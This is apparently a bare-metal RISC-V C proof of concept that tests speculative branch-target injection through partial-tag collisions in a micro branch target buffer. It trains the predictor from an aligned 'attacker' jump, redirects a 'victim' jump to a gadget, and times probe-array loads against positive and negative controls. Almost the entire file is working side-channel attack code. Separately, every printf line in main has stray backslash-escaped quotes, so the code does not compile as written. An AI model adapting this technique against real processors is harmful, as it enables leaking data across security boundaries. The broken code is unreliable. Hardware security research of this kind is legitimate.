#include <stdint.h>
#include <stdio.h>

// Stack definition
static uint64_t _stack[512] __attribute__((aligned(16)));
uint64_t * const _stack_top = _stack + 512;

// Terminal host signal
extern volatile uint64_t tohost;

// Probe array: 128 cache lines of 64 bytes each = 8 KB
static volatile uint8_t probe_array[128 * 64] __attribute__((aligned(64)));

// Target arrays for delaying JALR resolution
static volatile uint64_t training_targets[128] __attribute__((aligned(64)));
static volatile uint64_t test_targets[128] __attribute__((aligned(64)));

// Results storage
static uint64_t positive_control_times[20];
static uint64_t negative_control_times[20];
static uint64_t attack_scenario_times[20];
static uint64_t attack_negative_times[20];

// Target function definitions
__attribute__((noinline)) void dummy_target(int index, int enable_load) {
    asm volatile("nop; nop; nop;");
}

__attribute__((noinline)) void speculative_gadget(int index, int enable_load) {
    if (enable_load) {
        // Speculative load from probe array
        volatile uint8_t val = probe_array[index * 64];
        (void)val;
    }
}

// Inline assembly functions with exact alignments
__attribute__((noinline)) void attacker_action(void (*target_fn)(int, int)) {
    asm volatile(
        ".option push\n\t"
        ".option norvc\n\t"
        ".p2align 12\n\t" // 4 KB boundary
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "mv a0, zero\n\t"
        "mv a1, zero\n\t"
        "add t0, %0, zero\n\t"
        "jalr ra, 0(t0)\n\t" // Attacker JALR at offset 44
        ".option pop\n\t"
        :
        : "r"(target_fn)
        : "a0", "a1", "t0", "ra", "memory"
    );
}

__attribute__((noinline)) void victim_action(volatile uint64_t *uncached_target_ptr, int index) {
    asm volatile(
        ".option push\n\t"
        ".option norvc\n\t"
        ".p2align 12\n\t" // 4 KB boundary
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "add a0, %1, zero\n\t"
        "li a1, 1\n\t"
        "ld t0, 0(%0)\n\t"   // Load from uncached target ptr (causes cache miss)
        "jalr ra, 0(t0)\n\t" // Victim JALR at offset 44
        ".option pop\n\t"
        :
        : "r"(uncached_target_ptr), "r"(index)
        : "a0", "a1", "t0", "ra", "memory"
    );
}

__attribute__((noinline)) void bti_control_action(volatile uint64_t *target_ptr, int index, int enable_load) {
    asm volatile(
        ".option push\n\t"
        ".option norvc\n\t"
        "add a0, %1, zero\n\t"
        "add a1, %2, zero\n\t"
        "ld t0, 0(%0)\n\t"
        "jalr ra, 0(t0)\n\t"
        ".option pop\n\t"
        :
        : "r"(target_ptr), "r"(index), "r"(enable_load)
        : "a0", "a1", "t0", "ra", "memory"
    );
}

// Helper to measure latency
inline uint64_t measure_one_read(volatile uint8_t *addr) {
    uint64_t start, end;
    asm volatile(
        "nop; nop; nop;\n\t"
        "rdcycle %0\n\t"
        "nop; nop; nop;\n\t"
        "lb zero, 0(%2)\n\t"
        "nop; nop; nop;\n\t"
        "rdcycle %1\n\t"
        "nop; nop; nop;\n\t"
        : "=&r"(start), "=&r"(end)
        : "r"(addr)
        : "memory"
    );
    return end - start;
}

void _start(void) __attribute__((naked, section(".text.init")));
void _start(void) {
    asm volatile(
        "la sp, _stack\n\t"
        "li t0, 512*8\n\t"
        "add sp, sp, t0\n\t"
        "jal main\n\t"
        :
        :
        : "memory"
    );
}

int main(void) {
    printf(\"--- Starting S-PTW-uBTB Experiment ---\\n\");

    // Initialize arrays
    for (int i = 0; i < 128; i++) {
        probe_array[i * 64] = 0xAA;
    }

    // 1. Positive Control: Same-context BTI speculation
    printf(\"Running Positive Control...\\n\");
    for (int t = 0; t < 20; t++) {
        int index = t + 5;

        // Train
        for (int j = 0; j < 15; j++) {
            training_targets[index] = (uint64_t)speculative_gadget;
            bti_control_action(&training_targets[index], index, 0);
        }

        // Test
        test_targets[index] = (uint64_t)dummy_target;
        bti_control_action(&test_targets[index], index, 1);

        // Measure
        positive_control_times[t] = measure_one_read(&probe_array[index * 64]);
    }

    // 2. Negative Control: No training
    printf(\"Running Negative Control...\\n\");
    for (int t = 0; t < 20; t++) {
        int index = t + 25;

        // Train to dummy
        for (int j = 0; j < 15; j++) {
            training_targets[index] = (uint64_t)dummy_target;
            bti_control_action(&training_targets[index], index, 0);
        }

        // Test
        test_targets[index] = (uint64_t)dummy_target;
        bti_control_action(&test_targets[index], index, 1);

        // Measure
        negative_control_times[t] = measure_one_read(&probe_array[index * 64]);
    }

    // 3. Attack Scenario: Cross-PC Partial-Tag Collision
    printf(\"Running Attack Scenario...\\n\");
    for (int t = 0; t < 20; t++) {
        int index = t + 45;

        // Attacker Trains the uBTB
        for (int j = 0; j < 15; j++) {
            attacker_action(speculative_gadget);
        }

        // Victim Runs (speculative redirection)
        test_targets[index] = (uint64_t)dummy_target;
        victim_action(&test_targets[index], index);

        // Measure
        attack_scenario_times[t] = measure_one_read(&probe_array[index * 64]);
    }

    // 4. Attack Negative Control: Attacker trains to dummy
    printf(\"Running Attack Negative Control...\\n\");
    for (int t = 0; t < 20; t++) {
        int index = t + 65;

        // Attacker Trains to dummy
        for (int j = 0; j < 15; j++) {
            attacker_action(dummy_target);
        }

        // Victim Runs
        test_targets[index] = (uint64_t)dummy_target;
        victim_action(&test_targets[index], index);

        // Measure
        attack_negative_times[t] = measure_one_read(&probe_array[index * 64]);
    }

    // Print results
    printf(\"--- Positive Control Times ---\\n\");
    uint64_t pos_sum = 0;
    for (int i = 0; i < 20; i++) {
        printf(\"Trial %d: %lu cycles\\n\", i, positive_control_times[i]);
        pos_sum += positive_control_times[i];
    }
    uint64_t pos_avg = pos_sum / 20;
    printf(\"Positive Control Average: %lu cycles\\n\", pos_avg);

    printf(\"--- Negative Control Times ---\\n\");
    uint64_t neg_sum = 0;
    for (int i = 0; i < 20; i++) {
        printf(\"Trial %d: %lu cycles\\n\", i, negative_control_times[i]);
        neg_sum += negative_control_times[i];
    }
    uint64_t neg_avg = neg_sum / 20;
    printf(\"Negative Control Average: %lu cycles\\n\", neg_avg);

    printf(\"--- Attack Scenario Times ---\\n\");
    uint64_t att_sum = 0;
    for (int i = 0; i < 20; i++) {
        printf(\"Trial %d: %lu cycles\\n\", i, attack_scenario_times[i]);
        att_sum += attack_scenario_times[i];
    }
    uint64_t att_avg = att_sum / 20;
    printf(\"Attack Scenario Average: %lu cycles\\n\", att_avg);

    printf(\"--- Attack Negative Control Times ---\\n\");
    uint64_t att_neg_sum = 0;
    for (int i = 0; i < 20; i++) {
        printf(\"Trial %d: %lu cycles\\n\", i, attack_negative_times[i]);
        att_neg_sum += attack_negative_times[i];
    }
    uint64_t att_neg_avg = att_neg_sum / 20;
    printf(\"Attack Negative Control Average: %lu cycles\\n\", att_neg_avg);

    printf(\"--- Experiment Finished ---\\n\");
    tohost = 1;
    while (1) {}
    return 0;
}

